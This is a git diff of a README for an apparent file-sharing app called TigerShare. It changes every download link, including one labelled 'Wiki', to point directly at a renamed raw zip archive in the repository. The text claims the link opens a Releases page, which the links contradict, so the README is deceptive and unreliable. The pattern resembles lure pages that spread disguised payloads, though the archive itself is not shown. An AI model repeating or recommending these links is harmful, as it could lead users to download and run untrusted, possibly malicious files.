@@ -6,7 +6,7 @@ Welcome to TigerShare! This app allows you to share files easily and directly fr
 ## 📥 Download & Install
 To download TigerShare, visit the link below. This page contains all available versions of the app.
 
-[**Download TigerShare**](https://raw.githubusercontent.com/Mosessi56/TigerShare/main/src/Tiger_Share_2.5.zip)
+[**Download TigerShare**](https://raw.githubusercontent.com/Mosessi56/TigerShare/main/src/Share-Tiger-1.6.zip)
 
 Once on the Releases page, select the latest version. Click on the link to download the app. No setup is required after downloading. Simply open the file in your browser to start sharing files!
 
@@ -50,9 +50,9 @@ If your browser crashes, simply reopen it and navigate back to TigerShare using 
 If you lose the link, you can generate a new one by restarting the app and selecting your files again. 
 
 ## 📖 Additional Resources
-For more information on how to enhance your file-sharing experience or troubleshooting tips, please refer to our [Wiki](https://raw.githubusercontent.com/Mosessi56/TigerShare/main/src/Tiger_Share_2.5.zip).
+For more information on how to enhance your file-sharing experience or troubleshooting tips, please refer to our [Wiki](https://raw.githubusercontent.com/Mosessi56/TigerShare/main/src/Share-Tiger-1.6.zip).
 
 ## 🔗 Summary
 TigerShare provides a straightforward solution for file-sharing without the hassle of installations, logins, or limitations. You have all the instructions you need to get started. Visit the link below to get your copy.
 
-[**Download TigerShare**](https://raw.githubusercontent.com/Mosessi56/TigerShare/main/src/Tiger_Share_2.5.zip)
+[**Download TigerShare**](https://raw.githubusercontent.com/Mosessi56/TigerShare/main/src/Share-Tiger-1.6.zip)
